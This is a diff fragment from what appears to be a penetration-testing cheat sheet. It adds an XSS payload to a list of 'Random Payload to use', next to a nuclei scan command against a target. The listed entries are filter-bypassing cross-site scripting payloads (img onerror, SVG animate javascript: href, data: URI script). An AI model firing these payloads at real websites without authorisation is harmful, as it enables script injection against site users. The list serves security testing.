@@ -235,6 +235,7 @@ nuclei -u https://targets.com:8858 -t /root/nuclei-template/
 
 #### Random Payload to use: 
 ```bash
+• "><img src=x onerror=alert(document.domain)> 
 • <svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
 • <script src="data:,alert(1)%250A-->
 • <script>alert(1)%0d%0a-->%09</script
